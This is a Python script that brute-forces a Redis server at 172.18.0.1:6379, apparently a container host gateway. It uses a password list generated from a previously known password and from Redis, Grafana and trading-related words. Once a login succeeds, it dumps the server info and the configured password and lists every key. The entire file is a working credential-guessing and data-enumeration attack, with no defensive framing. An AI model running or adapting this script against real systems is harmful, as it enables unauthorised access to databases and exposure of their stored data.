import socket

# Pattern-based wordlist dari known password Passwd2024!
words = ["Passwd","Redis","Grafana","Admin","Quant","Trading","Kline","Password","Root","Secret","Master","Data","Cache","Server","Live","Ha","Session"]
years = ["2024","2025","2023","2026"]
symbols = ["!","@","#","!!","@#","!@#",""]
extras = [
    # direct variations of Passwd2024!
    "Passwd2024!", "passwd2024!", "PASSWD2024!",
    "Passwd2024", "passwd2024",
    "Passwd2024!!", "Passwd2024@",
    "Passwd2024!@#", "P@sswd2024!",
    # Redis specific
    "redis", "Redis", "REDIS",
    "redis123", "Redis123", "Redis2024!",
    # admin123 variations  
    "admin123", "Admin123!", "admin123!",
    # Common strong
    "P@ssw0rd", "Aa123456", "Qwerty123!",
    "ChangMe2024!", "Default2024!",
    "Grafana2024!", "grafana2024!",
]

# Generate pattern-based passwords
passwords = list(extras)
for w in words:
    for y in years:
        for s in symbols:
            passwords.append(f"{w}{y}{s}")

passwords = list(dict.fromkeys(passwords))  # dedupe
print(f"Testing {len(passwords)} passwords...")

for pw in passwords:
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect(("172.18.0.1", 6379))
        s.send(f"AUTH {pw}\r\n".encode())
        r = s.recv(100).decode()
        if "+OK" in r:
            print(f"\nREDIS PASSWORD FOUND: {pw}")
            s.send(b"INFO server\r\n")
            info = s.recv(4000).decode()
            print(info[:300])
            s.send(b"CONFIG GET requirepass\r\n")
            conf = s.recv(1000).decode()
            print(f"\nConfig: {conf}")
            s.send(b"KEYS *\r\n")
            keys = s.recv(4000).decode()
            print(f"\nKeys: {keys[:500]}")
            s.close()
            break
        s.close()
    except:
        pass
else:
    print("NO MATCH FOUND")
